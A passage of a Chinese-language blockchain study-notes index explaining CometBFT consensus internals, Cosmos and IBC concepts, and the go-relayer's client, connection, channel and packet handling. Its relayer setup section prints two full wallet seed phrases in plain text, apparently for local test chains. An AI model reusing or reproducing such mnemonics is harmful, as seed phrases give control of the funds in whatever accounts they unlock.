&lt;-t.timer.C:\n\t\t\tt.Logger.Info(&quot;Timed out&quot;, &quot;dur&quot;, ti.Duration, &quot;height&quot;, ti.Height, &quot;round&quot;, ti.Round, &quot;step&quot;, ti.Step)\n\t\t\t// go routine here guarantees timeoutRoutine doesn&#039;t block.\n\t\t\t// Determinism comes from playback in the receiveRoutine.\n\t\t\t// We can eliminate it by merging the timeoutRoutine into receiveRoutine\n\t\t\t//  and managing the timeouts ourselves with a millisecond ticker\n\t\t\tgo func(toi timeoutInfo) { t.tockChan &lt;- toi }(ti)\n\t\tcase &lt;-t.Quit():\n\t\t\treturn\n\t\t}\n\t}\n}\n\ntickChan ：接收各种超时信息，然后重置定时器\ntimer.C: 根据tickChan ，将tickChan传过来的超时信息送到tockChan 进行处理\n在receiveRoutine里，会有case一直监听tockChan，来处理超时消息\n\n完整的共识流程阶段\n共识过程的启动\n也是从节点启动命令开始，一直调用到state的onstart方法：\nfunc (cs *State) OnStart() error{\n  cs.loadWalFile()\n  ....\n  cs.timeoutTicker.Start()\n  ...\n  loop\n  for{\n    ????\n  }\n  cs.evsw.Start()\n  ...\n  cs.checkDoubleSigningRisk(cs.Height)\n  ...\n  go cs.receiveRoutine(0)\n  ...\n  cs.scheduleRound0(cs.GetRoundState()) // 他这个思路是往timeoutTicker发送消息，由receiveRoutine来处理，在新高度开启新round\n}\n\n处理状态转换消息 ： cs.receiveRoutine(0)\n开启第一轮共识： cs.scheduleRound0(cs.GetRoundState())\n\n首先还是从开启第一轮共识开始：\n开启第一轮共识\n①：首先发送timeoutInfo{duration, height, round, step}到tickchan , 然后重置定时器，将超时信息发往tockChan\n②：tockchan会通过handleTImeout来处理消息，进入到enterNewRound\n③：进入到enterprose， 如果是proposer， cs.decideProposal(height, round)进入组块流程\n\n\nblock, err = cs.createProposalBlock(context.TODO())\n\n\nblock.MakePartSet(types.BlockPartSizeBytes) 切割区块\n\n\ncs.sendInternalMessage(msgInfo{&amp;ProposalMessage{proposal}, &quot;&quot;})  将proposal和blockparts发送到内部消息队列里\n\n\ncs.sendInternalMessage(msgInfo{&amp;BlockPartMessage{cs.Height, cs.Round, part}, &quot;&quot;})\n\n\n到此会把这两部分消息发给内部共识状态的 receiveroutine来处理\n\n\n外部的话需要再次回到enterPropose， 在defer中通过eventBus 通知外部调用者，比如通过websocket订阅了事件的，然后通过eventswitch来通知内部订阅了NewRoundStep事件的组件（这里指consensus reactor）， 通过FireEvent 来触发监听器回调他注册的处理函数\nconR.broadcastNewRoundStepMessage(data.(*cstypes.RoundState))\nconst subscriber = &quot;consensus-reactor&quot;\n\tif err := conR.conS.evsw.AddListenerForEvent(subscriber, types.EventNewRoundStep,\n\t\tfunc(data cmtevents.EventData) {\n\t\t\tconR.broadcastNewRoundStepMessage(data.(*cstypes.RoundState))\n\t\t}); err != nil {\n\t\tconR.Logger.Error(&quot;Error adding listener for events&quot;, &quot;err&quot;, err)\n\t}\n \nfunc (conR *Reactor) broadcastNewRoundStepMessage(rs *cstypes.RoundState) {\n\tnrsMsg := makeRoundStepMessage(rs)\n\tconR.Switch.Broadcast(p2p.Envelope{\n\t\tChannelID: StateChannel,\n\t\tMessage:   nrsMsg,\n\t})\n}\n\n\n④：上面提到的组块流程如下，回到cs.createProposalBlock\n\n\n获取可验证的恶意行为\n\n\n从mempool中获取最大maxBytes 的交易（都是字节切片）\n\n\n他会请求APP执行PrepareProposal （app层可以修改删除事务，这是cometBFT 后加的），理由：\n\n\n// Ref: github.com/cosmos/cosmos-sdk/blob/main/docs/architecture/adr-060-abci-1.0.md\n// Ref: github.com/cometbft/cometbft/blob/main/spec/abci/abci%2B%2B_basic_concepts.md\n\n\n构造区块，基本就完成了\n\n\n⑤：通过P2P广播出去的消息，在哪里接收，这部分得看p2p如何处理消息\n⑥：由我们从p2p发出去的共识消息，会经过其他节点的p2p模块转发到consensus reactor 的func (conR *Reactor) Receive(e p2p.Envelope) 来进行处理， 作为回调函数处理p2p消息，应该有一个peer的循环，收到相关消息，会调用注册的reactor的回调函数\n\n上面的proposal消息 和blockpart消息会进入到DataChannel， 关于状态转换的消息会进入到StateChannel，先看下datachannel中的消息\ndatachannel中的消息会进入到peerMsgQueue 进行处理，会设置propoal,和添加完整块，会根据当前状态，决定进入enterPrevote 还是enterPrecommit还是tryFinalizeCommit\nstatechannel中的roundstep会更新peerstate\n\n⑦：接着正常步骤，进入到Prevote\n\n步骤跟上面一致, 进入到addnote处理，会执行enterprecommit处理\n\n⑧：进入entercommit\n⑨：进入到finalizecommit\n\n持久化区块数据\n调用 baseapp的 FinalizeBlock （执行begin blcok , txs ,endblock）返回了apphash\n更新内存池\ncs.scheduleRound0(&amp;cs.RoundState) 继续新round\n\n技术细节\n\neventswitch 事件总线的设计\nblock parts 如何通过merkle proof 来证明\n\n\nenterNewRound\n\n更新validators （来源）\n更新Proposer （算法细节待了解）\n更新RoundStep Height → RoundStepNewRound\nEventbus 发布事件\nenterPropose\n\nenterPropose\n\n决定proposal block\n从evpool获取作恶行为数据\n从mempool 获取交易数据\n通过现有的高度，txs, proposeraddr等数据构造block\n请求APP执行PrepareProposal,由应用程序选择交易，之前tendermint是没有这一步的，设计原理参考：\n\ngithub.com/cosmos/cosmos-sdk/blob/main/docs/architecture/adr-060-abci-1.0.md\ngithub.com/cometbft/cometbft/blob/main/spec/abci/abci%2B%2B_basic_concepts.md\n\n\n最后再重新构造一下block\n将构造的块进行切割，并计算merkle 树 （TODO）\n构造proposal 并签名，这个proposal并不是区块，只是区块的hash,以及高度，当前round，区块分割的信息\n将proposal和分割的blockparts 发到内部消息队列进行处理 （异步消息处理），直接返回\n更新RoundStepNewRound → RoundStepPropose\nFireEvent (EventNewRoundStep),reactor监听此事件并通过p2p 发送broadcastNewRoundStepMessage消息\n\nenterprevote\n\n进入到这个阶段，是获取到了2/3票，cs.isProposalComplete（TODO）\n执行预投票\n\n从共识角度验证提案块，区块无效则投nil票\n调用app 来执行提案块\n有效则签署投票，并将投票信息发布到内部消息队列中\n\n\n更新RoundStepPropose → RoundStepPrevote\nFireEvent(eventVote), broadcastHasVoteMessage\n\nenterPrecommit\n\n更新RoundStepPrevote → RoundStepPrecommit\n\nenterCommit\n\n更新RoundStepPrecommit → RoundStepCommit\nFireEven（EventValidBlock）\nfinalizeCommit\n\n校验block\n存储块到block store\napplyblock\n\nbuildLastCommitInfo\nblockExec.proxyApp.FinalizeBlock（执行startblock,txs, endblock）, 会返回apphash和更新的validator，以及txresult\n之后会调用app 提交更新完的kv state store\n最后block store 会保存app层返回的数据\n\n\n开启新round scheduleRound0\n\n\n\n分别介绍上述几个消息\nproposal\nblockparts\nvote\n如何验证validator"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/死磕cometBFT共识源码":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/死磕cometBFT共识源码","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/死磕cometBFT共识源码.md","title":"死磕cometBFT共识源码","links":[],"tags":[],"content":"\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cosmos开发者":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cosmos开发者","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cosmos开发者.md","title":"cosmos开发者","links":[],"tags":[],"content":"\n\n他的多链架构可以让一个应用程序在不同的IBC协调的链上并行运行，无论是否由相同的验证器集运行。这种跨链的水平可扩展性理论上允许无限的类似垂直的可扩展性，减去协调开销。\n\n\n*Hub zone,我们如何将我们的链连接到非 Tendermint 链？*IBC 连接不限于基于 Tendermint 的链。如果另一个非 Tendermint 区块链使用快速最终共识算法，则可以通过使 IBC 适应非 Tendermint 共识机制来建立连接。\n如果另一条链是概率确定性链，则 IBC 的简单改编是不够的。称为peg-zone的代理链有助于建立互操作性。Peg-zones 是快速终结性区块链，它跟踪链状态以建立终结性。peg-zone 链本身是 IBC 兼容的，并充当IBC 网络其余链和概率最终链之间的桥梁。\n\n\nCLI命令构建区块链\n\n\ncosmos wasm 一个用于开发和测试智能合约的多链平台\n\n\nEthemint将EVM作为SDK模块\n\n\n质押atom 获取收益\n\n\nAlthea Testnet 存储库：Gravity Bridge （cosmos上面的跨链桥）， 将 Cosmos 与以太坊连接起来，并允许在基于 Cosmos 的区块链之间传输 ERC-20 代币。\n\n\n针对私有链之间的跨链通信www.hyperledger.org/blog/2021/06/09/meet-yui-one-the-new-hyperledger-labs-projects-taking-on-cross-chain-and-off-chain-operations\n\n\ncosmos的相关所有库文件 github.com/cosmos/awesome-cosmos\n\n\nIBC支持同构链和异构链，支持非最终一致性和最终一致性链互相跨链\n\n\nyoutu.be/OSMH5uwTssk 允许无数主权区块链之间的互操作性的方法以及如何构建与 IBC 兼容的应用程序进行了演讲。\n\n\nyoutu.be/zUVPkEzGJzA 他解释了如何使用区块链间通信 (IBC) 协议连接不同的区块链，特别关注轻客户端、连接、通道, 和数据包承诺\n\n\n跨链账户概念\n\n\nyoutu.be/X5mPQrCLLWE  他研究了 IBC 数据包生命周期和轻客户端的安全属性\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cosmos源码":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cosmos源码","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cosmos源码.md","title":"cosmos源码","links":[],"tags":[],"content":"\nCosmos-sdk\nTendermint   core 0.33.3\ncosmo-sdk 0.38.4\nIavl 0.13.3\nGaia 2.0.11\n\n共识协议\n半同步网络模型\n\n正确性\n一致性\n可结束性\n\nn: 总人数 f:拜占庭节点\nn &gt; 3f ,可以完成共识 ⇒ n&gt;=3f+1 ⇒ n-f &gt;= 2f+1\nCAP证明过程\n通过聚合签名将签名信息压缩成一个签名信息，可以降低通信量。常见的聚合签名的库\ntendermint 协议\npbft中收到的是2f+1节点，tendermint则是总投票权重2/3，并且基于p2p网络进行广播通信，并且存在round的概念，也就是说在一个高度失败了，会进行切换round并重试。\n\nPrposer 离线\n区块不合法\n区块未及时广播\n未在有效的时间收集2/3的预投票\n未在有效时间收集2/3预提交\n\n如果一直收集不到，实际就会不断地round，直到收集全，一旦收集全，就是最终一致性，不需要重组区块。\nlock-unlock\nlock：\n当验证者对一个区块进行了预提交投票之后，则该验证者必须锁定在此区块上，也就意味着不管什么原因全网未共识，则在后续round的投票过程中必须投给自己当前锁定的区块。即使自己成为新的提案者，也必须提交该区块。这是为了验证者在同一个区块高度对不同的区块进行预投票。\nunlock：\n验证者在看到一个具有更高轮数的polka时可以从自己当前锁定的区块解锁。从而避免死锁。\nvalidator轮换\n被选中的概率与投票权重成正比，根据优先级选取（根据当前valset更新），若优先级相等，则根据地址最小选取。\n需要满足：\n\n相同高度的valset 想通，且投票权重一致\n不同高度以上都是不同的\n概率与投票权重占比一致\n\n轮换机制需要进一步确认✅\ntendermint将当前区块的投票签名存储到下一个高度区块中，因为投票过程中当前区块内容是不允许发生变化的。 用lastCommit保存，结构如下：\nsignature\nheight\nround\nBlockID\nMerkle树 ✅    很多思想保存数据用到了，包括在做的公链改动，实际也是利用了其原理保存部分数据\n需要对签名有个详细的理解✅\n双签举证\n1个公钥对应两个投票，并且这个必须是放在区块中上链的。\ntendermint core\n反应器\n不同的消息处理实现不同的反应器\n这一部分先大概得过了，后面回头再看✅\nhook使用✅ （回调接口）"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/cross-chain-via-relayer":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/cross-chain-via-relayer","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/cross chain via relayer.md","title":"cross chain via relayer","links":[],"tags":[],"content":"build ibc module\nReference: docs.ignite.com/guide/ibc\nignite chain serve  --reset-once --config earth.yml\nignite chain serve  --reset-once --config mars.yml\nchange config.toml\nfix :error query block data\nThe relayer looks back in time at historical transactions and needs to have an index of them.\nSpecifically check ~/.&lt;node_data_dir&gt;/config/config.toml has the following fields set:\nindexer = &quot;kv&quot;\nindex_all_tags = true\nconfig relayer\n[Configure the chains you want to relay between]\nrly config init\n[Configure the chains you want to relay between]\nrly chains add  --file ibc-0.json ibc0\nrly chains add  --file ibc-1.json ibc1\n[Import OR create new keys for the relayer to use when signing and relaying transactions.]\n## represent realyer memonic\nrly keys restore ibc0 relayer &quot;equal party manual lottery glimpse guard giggle idle winner hundred pizza donkey maximum camera crystal camp bulb wine wild prosper digital oyster left monster&quot;\n \n \nrly keys restore ibc1 relayer &quot;prison combine panther someone crack pigeon junior remember uniform power cupboard humor such spin tuna urge oak amused crisp zone unknown lab easily mammal&quot;\n[change config.yaml key as relayer]\nglobal:\n    api-listen-addr: :5183\n    timeout: 10s\n    memo: &quot;&quot;\n    light-cache-size: 20\nchains:\n    ibc0:\n        type: cosmos\n        value:\n            key-directory: /Users/carver/.relayer/keys/earth\n            key: &quot;relayer&quot;  ## change\n            \n    ibc1:\n        type: cosmos\n        value:\n            key-directory: /Users/carver/.relayer/keys/mars\n            key: &quot;relayer&quot;  ## change \n            chain-id: mars\n[Ensure the keys associated with the configured chains are funded.]\nrly q balance ibc0\nrly q balance ibc1\n[Create Path Across Chains.]\n1. Add basic path info to config\nrly paths new earth mars demo-path\n \n2. Next we need to create a channel, client, and connection\n\ta. rly transact clients demo-path\n\tb. rly transact connection demo-path\n\tc. rly transact channel demo-path --src-port blog --dst-port blog --version blog-1\n[Finally, we start the relayer on the desired path]\nrly paths list\nrly start [path]\nrly start \nsend IBC msg\nReference: docs.ignite.com/guide/ibc"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/go-relayer源码分析":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/go-relayer源码分析","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/go-relayer源码分析.md","title":"go-relayer源码分析","links":[],"tags":[],"content":"配置跨链\n参考：github.com/cosmos/relayer\n要通过IBC协议进行跨链，中间组件Relayer必不可少，他充当了消息的转发器，将指定消息路由到对应的链上，要正确使用Relayer需要以下配置：\n\n配置想要Relay的两条链\n导入Relayer在两条链上的Key\n配置好跨链路径\n启动跨链\n\n配置跨链路径主要使用已配置的路径在两个已配置的链之间创建客户端、连接和通道，只有当两条链直接可以通信，Relayer才能正确的工作，基于事件查询未传递的IBC消息，并路由到指定链上进行处理，以下主要分析关键的功能\n创建客户端\n对于跨链两端，都必须能够验证对手链的证明和状态，所以对于src链和dst链，src链必须存有dst链轻客户端状态，dst链必须存有src链轻客户状态。\nRelayer会通过以下函数创建客户端，分别为对手链创建客户端:\n// Create client on src for dst if the client id is unspecified\n\t\tclientSrc, err = CreateClient(egCtx, c, dst, srcUpdateHeader, dstUpdateHeader, allowUpdateAfterExpiry, allowUpdateAfterMisbehaviour, override, customClientTrustingPeriod, memo)\n \n\t// Create client on dst for src if the client id is unspecified\n\t\tclientDst, err = CreateClient(egCtx, dst, c, dstUpdateHeader, srcUpdateHeader, allowUpdateAfterExpiry, allowUpdateAfterMisbehaviour, override, customClientTrustingPeriod, memo)\nRelayer会先创建createClienetMsg,然后发送到对手链上:\ncreateMsg, err := src.ChainProvider.MsgCreateClient(clientState, dstUpdateHeader.ConsensusState())\nres, success, err = src.ChainProvider.SendMessages(ctx, msgs, memo)\n之后，tendermint会将tx打包，并路由到ibc模块进行相应的消息处理：\nfunc (k Keeper) CreateClient(\n\tctx sdk.Context, clientState exported.ClientState, consensusState exported.ConsensusState,\n) (string, error) {\n\t...\n\tclientID := k.GenerateClientIdentifier(ctx, clientState.ClientType())\n\tclientStore := k.ClientStore(ctx, clientID)\n \n\tif err := clientState.Initialize(ctx, k.cdc, clientStore, consensusState); err != nil {\n\t\treturn &quot;&quot;, err\n\t}\n \n\tif status := k.GetClientStatus(ctx, clientState, clientID); status != exported.Active {\n\t\treturn &quot;&quot;, errorsmod.Wrapf(types.ErrClientNotActive, &quot;cannot create client (%s) with status %s&quot;, clientID, status)\n\t}\n\t...\n\temitCreateClientEvent(ctx, clientID, clientState)\n \n\treturn clientID, nil\n}\n源连会根据relayer提供的对手链clientState和consensus state 初始化一个客户端，并将其存储在自己链上。\n\n\nClient state是用于描述其他链的状态和特性的数据结构。它包含了其他链的基本信息，如链的ID、状态根、验证人集合等。该状态还包含了一些元数据，如链的名称、版本号等。\n\n\nConsensus state是用于描述其他链的共识状态的数据结构。它包含了其他链的最新共识状态，例如其他链的最新区块头和验证人集合。该状态还包含了一些元数据，如最新高度、最新时间戳等\n\n\n经过这一步，两端都会有各自对手链的轻客户端，从而验证证明和状态。\n创建连接\n当创建了客户端之后，需要创建两个链之间的连接，连接的创建需要通过4个阶段的握手来实现，类似于TCP3阶段握手，过程如下：\n\n阶段1：connOpenInit\n\n​\tINIT状态的新连接被创建并存储在启动区块链上\n\n阶段2：connOpenTry\n\n​\t如果已验证INIT状态的连接是在发起链上创建的，relyer则会创建TRYOPEN状态的新连接并将其存储在相反的区块链上。\n\n阶段3：connOpenAck\n\n​\t如果src链已验证TRYOPEN状态的连接是在dst链上创建的，则src链上的连接状态将从INIT更新为OPEN\n\n阶段4：connOpenConfirm\n\n​\t如果验证了发起链上的连接状态从INIT转换为OPEN，则在相反链上，连接状态将从TRYOPEN更新为OPEN\n中间的状态转换所构造的消息都是由Relayer完成并发送到对应链上的。就以connOpenInit为例：\nRelayer组装如下的初始化连接消息，并发送到src链上，通过ibc协议进行处理。\nmsg := &amp;conntypes.MsgConnectionOpenInit{\n\t\tClientId: info.ClientID,\n\t\tCounterparty: conntypes.Counterparty{\n\t\t\tClientId:     info.CounterpartyClientID,\n\t\t\tConnectionId: &quot;&quot;,\n\t\t\tPrefix:       info.CounterpartyCommitmentPrefix,\n\t\t},\n\t\tVersion:     nil,\n\t\tDelayPeriod: defaultDelayPeriod,\n\t\tSigner:      signer,\n\t}\nfunc (k Keeper) ConnOpenInit(\n\tctx sdk.Context,\n\tclientID string,\n\tcounterparty types.Counterparty, // counterpartyPrefix, counterpartyClientIdentifier\n\tversion *types.Version,\n\tdelayPeriod uint64,\n) (string, error) {\n\t...\n\tclientState, found := k.clientKeeper.GetClientState(ctx, clientID)\n\tif !found {\n\t\treturn &quot;&quot;, errorsmod.Wrapf(clienttypes.ErrClientNotFound, &quot;clientID (%s)&quot;, clientID)\n\t}\n \n\tif status := k.clientKeeper.GetClientStatus(ctx, clientState, clientID); status != exported.Active {\n\t\treturn &quot;&quot;, errorsmod.Wrapf(clienttypes.ErrClientNotActive, &quot;client (%s) status is %s&quot;, clientID, status)\n\t}\n \n\tconnectionID := k.GenerateConnectionIdentifier(ctx)\n\tif err := k.addConnectionToClient(ctx, clientID, connectionID); err != nil {\n\t\treturn &quot;&quot;, err\n\t}\n \n\t// connection defines chain A&#039;s ConnectionEnd\n\tconnection := types.NewConnectionEnd(types.INIT, clientID, counterparty, types.ExportedVersionsToProto(versions), delayPeriod)\n\tk.SetConnection(ctx, connectionID, connection)\n...\n}\n首先获取所有兼容的版本，然后检查传入的版本是否被支持。如果不支持，则返回错误。接下来，它获取客户端状态，并检查该客户端是否存在以及是否处于活动状态。如果客户端不存在或不处于活动状态，则返回错误。\n然后，该方法生成一个连接ID，并将其添加到客户端中。接着，它创建一个新的连接，并将其设置为INIT状态，表示连接已初始化但尚未确认。这样连接就绑定到具体的客户端上。且连接状态为Init, 之后Relayer会进行几轮的状态转换，使得两端的连接状态都到达open，这样表示连接的握手成功真正可以用了。 这里就会有个问题，4阶段握手能否优化，以及为什么需要4阶段。\n\n\n创建channel\n在介绍channel之前还需要理解一个概念port，它表示链上的一个模块，那么既然这个模块要跨链，必须创建跨链通道channel，所以port+channel可以用来表示和某个链的跨链信道，channel则会关联另外一个链的port+channel，可以形象的看做一个桥的两半必须合在一起才能通信，所以在创建channel的时候也会进行4阶段握手，将自己的port+channel和对方的port+channel关联起来，这样才能在通道中发送packet。\n另外一个概念Capability, 描述模块所具备的能力，IBC中会通过portA+channel1来声明portA具备跨链能力，同时channel绑定了对手链的portB+channelB以及连接信息，也就是说这个能力抽象了A链和B链的跨链通信，假设A链要和C链进行通信，必须声明portA+channel2(绑定portC+channelC的信息)的能力。这种面向对象能力的设计思想使得应用程序或模块只能在指定的通道上进行跨链交互操作，这种方式可以提高跨链交互的安全性和可靠性。\n\n\n到此为止IBC/TAO层的准备工作完毕，链之间创建了轻客户端，连接以及通信信道，用户可以基于IBC/APP层进行跨链通信，通过packet的形式发出，Relayer则会启动事件监听来Relay跨链packet。\nrelayer消息处理设计\nEventProcessor是Relayer的主要处理器，其包含chainProcessors 和 pathProcessors两个关键对象：\nChainProcessor 接口负责轮询块并将 IBC 消息事件发送到 PathProcessor。它还负责跟踪打开的通道，而不是将消息发送到关闭通道的 PathProcessors。\nPathProcessor是一个处理来自一对链的传入 IBC 消息的进程。 它确定需要中继哪些消息并发送它们。一条链对应一个chainprocessor\nchainProcessor工作任务\nfunc (ccp *CosmosChainProcessor) Run(ctx context.Context, initialBlockHistory uint64) error {\n\t...\n\tfor {\n    \t// Infinite retry to get initial latest height\n\t\t....\n\t}\n\t...\n\tvar eg errgroup.Group\n\teg.Go(func() error {\n\t\treturn ccp.initializeConnectionState(ctx)\n\t})\n\teg.Go(func() error {\n\t\treturn ccp.initializeChannelState(ctx)\n\t})\n\tif err := eg.Wait(); err != nil {\n\t\treturn err\n\t}\n \n\tccp.log.Debug(&quot;Entering main query loop&quot;)\n \n\tticker := time.NewTicker(persistence.minQueryLoopDuration)\n\tdefer ticker.Stop()\n \n\tfor {\n\t\tif err := ccp.queryCycle(ctx, &amp;persistence); err != nil {\n\t\t\treturn err\n\t\t}\n\t\tselect {\n\t\tcase &lt;-ctx.Done():\n\t\t\treturn nil\n\t\tcase &lt;-ticker.C:\n\t\t\tticker.Reset(persistence.minQueryLoopDuration)\n\t\t}\n\t}\n}\n \nChainpropossor 启动后会启动任务让不同的链各自不断尝试获取最新的高度，并从上次查询和目前最新高度的差值中获取所有的IBC相关的事件，并将其转换成对应的消息，分门别类的放到缓存中（IBCMessagesCache），根据高度排序的\ntype IBCMessagesCache struct {\n\tPacketFlow          ChannelPacketMessagesCache\n\tConnectionHandshake ConnectionMessagesCache\n\tChannelHandshake    ChannelMessagesCache\n\tClientICQ           ClientICQMessagesCache\n}\n接着会把链相关的一包数据丢给pathprocessor相关的pathend去处理。\npathProcessor\npathprocessor一直等待来自chanproposor的消息，并进行处理，其主流程如下：\nfunc (pp *PathProcessor) Run(ctx context.Context, cancel func()) {\n\tvar retryTimer *time.Timer\n \n\tpp.flushTicker = time.NewTicker(pp.flushInterval)\n\tdefer pp.flushTicker.Stop()\n \n\tfor {\n\t\t// block until we have any signals to process\n\t\tif pp.processAvailableSignals(ctx, cancel) {\n\t\t\treturn\n\t\t}\n \n\t\tfor len(pp.pathEnd1.incomingCacheData) &gt; 0 || len(pp.pathEnd2.incomingCacheData) &gt; 0 || len(pp.retryProcess) &gt; 0 {\n\t\t\t// signals are available, so this will not need to block.\n\t\t\tif pp.processAvailableSignals(ctx, cancel) {\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n \n\t\tif !pp.pathEnd1.inSync || !pp.pathEnd2.inSync {\n\t\t\tcontinue\n\t\t}\n \n\t....\n \n\t\t// process latest message cache state from both pathEnds\n\t\tif err := pp.processLatestMessages(ctx, cancel); err != nil {\n\t\t\t// in case of IBC message send errors, schedule retry after durationErrorRetry\n\t\t\tif retryTimer != nil {\n\t\t\t\tretryTimer.Stop()\n\t\t\t}\n\t\t\tif ctx.Err() == nil {\n\t\t\t\tretryTimer = time.AfterFunc(durationErrorRetry, pp.ProcessBacklogIfReady)\n\t\t\t}\n\t\t}\n\t}\n}\nprocessAvailableSignals会一直接收消息， 直到消息全部接收完毕（A链-B链消息），之后会将两个链上的4类消息进行一类一类的合并，之后将执行4类消息，过程如下：\nfunc (mp *messageProcessor) processMessages(\n\tctx context.Context,\n\tmessages pathEndMessages,\n\tsrc, dst *pathEndRuntime,\n) error {\n\tneedsClientUpdate, err := mp.shouldUpdateClientNow(ctx, src, dst)\n\tif err != nil {\n\t\treturn err\n\t}\n \n\tif err := mp.assembleMsgUpdateClient(ctx, src, dst); err != nil {\n\t\treturn err\n\t}\n \n\tmp.assembleMessages(ctx, messages, src, dst)\n \n\treturn mp.trackAndSendMessages(ctx, src, dst, needsClientUpdate)\n}\n \n首先升级相关客户端，并组装4类消息为cosmos msg,然后发送消息到mempool中，完成消息的传递。\n\nRelayer 根据不同的链先通过chainprocessor获取指定区块区间的所有IBC事件，再将其转换成不同类别消息分发给相关的pathprocessor,pathprocessor再将不同类别的消息，分别开4个go协程通过组装函数，发送消息函数来进行一致化处理。\nrelay packect\n\n\nrelayer对 packet 进行基础校验\n\n\nRelayer准备packect commitment(packet proof) 以及对应高度 ，来源src\n\n\n然后准备一个msgrecvPackect 在 dst 上带调用 (附带了src packet 的包的存在性证明)\nmsg := &amp;chantypes.MsgRecvPacket{\n\t\tPacket:          msgTransfer.Packet(),\n\t\tProofCommitment: proof.Proof,\n\t\tProofHeight:     proof.ProofHeight,\n\t\tSigner:          signer,\n\t}\n\n\n准备升级客户端的消息\n\n\n将消息发到对应链的池子中\n\n\nrelay ack\n\n\n查询dst 上PacketAcknowledgement ，代表Relayer发送的msgrecvpacket消息已经在dst链上被执行了\n\n\nRelayer 准备 MsgAcknowledgement\nmsg := &amp;chantypes.MsgAcknowledgement{\n\t\tPacket:          msgRecvPacket.Packet(),\n\t\tAcknowledgement: msgRecvPacket.Ack,\n\t\tProofAcked:      proof.Proof,\n\t\tProofHeight:     proof.ProofHeight,\n\t\tSigner:          signer,\n\t}\n \n\n\nRelayer会升级在src链上的dst轻客户端\n\n\nRelayer将这两类消息发送到src\n\n\nrelayer付费\n\n当监控到来源于src的packet时候，需要查询packect commitment ,这部分需要付费\n升级在dst链上的src轻客户端需要付费\n然后需要构造msgrecvpacket 在dst链上发送也需要付费\n升级在src链上的dst轻客户端需要付费\n构造MsgAcknowledgement，发送src链，也需要付费\n\nrelayer的激励机制\nReference:\n\ngithub.com/cosmos/ibc/issues/578\nmedium.com/imperator-guide/ics29-how-do-relayer-fees-work-with-ibc-in-the-cosmos-ecosystem-e89ae6cf4530\n\n参考\n\nics protocol\nibc-go\nrelayer-go\nhow ibc works between blockchains\nhermes guide\n面向对象能力设计思想\ngood-articles\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/ibc-middleware":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/ibc-middleware","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/ibc-middleware.md","title":"ibc-middleware","links":[],"tags":[],"content":""},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/ibc原理":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/ibc原理","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/ibc原理.md","title":"ibc原理","links":[],"tags":[],"content":"\nibc协议核心\nibcprotocol.dev/protocol/\nibc.cosmos.network/main/ibc/overview.html\nibc 轻客户端端\ngithub.com/tendermint/tendermint\nibc app\ngithub.com/cosmos/ibc/pull/615/files\nibcprotocol.dev/applications/\nibc doc\nibcprotocol.dev/documentation\nzk&amp;modular-IBC\n针对异构链,并且和celestia合作\npolymerlabs.medium.com/blockchain-bridges-101-a-guide-to-inter-blockchain-communication-ibc-3efc092770b1"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/ibc如何工作":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/ibc如何工作","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/ibc如何工作.md","title":"ibc如何工作","links":[],"tags":[],"content":"概述\n跨链通信协议（IBC）是一种互操作性协议，采用两层式设计：一层是传输层，负责将数据组装成通用数据包，以及跨链验证该数据；另一层是应用层，负责解读数据包内容，并决定对所传输数据应执行的下一步操作。IBC 协议在事务验证及数据包正确性方面的安全性是通过传输层的轻客户端来保证的，而不是通过负责在不同链上的 IBC 客户端之间传递数据包的中继器。\nIBC 架构\nIBC 是个分层协议，主要由以下组成\n\nIBC/TAO\nIBC/APP\n\n\nIBC/TAO\nIBC/TAO 是一个以可靠和经过身份验证的方式在两个区块链之间中继数据包的层。\n可靠指源连的数据包发送只会被目标链接受一次且无需信任，数据包是由Relayer在区块链之间进行传递，任何人都可以成为Relayer。\n身份认证可以这么理解，ibc 的channel+port 定位了数据包要发送到哪个具体模块（合约）进行处理，任何其他的模块或者合约都无法通过通道发送。所以ibc的核心主要有以下部分：\n\nligtht client\nconnection\nchannel\npacket\n\nlight client\n每当一个新的块头被附加到dst区块链上时，relayer就会查询该头并将其提交给src链上的IBC/TAO模块。然后IBC/TAO模块根据对方区块链执行轻客户端协议以检查块头是否有效，并且只有在块头有效的情况下才更新dst区块链的ClientState。\n一旦ClientState被更新为具有dst链的最新块头，IBC/TAO模块就可以检查所呈现的状态是否存储在对方区块链中。例如，如果dst链使用merkle树来存储其世界状态，并在每个区块头中包括merkle树根哈希（如以太坊），则可以使用merkle-证明来证明和验证树中的智能合约状态存在于区块链上. 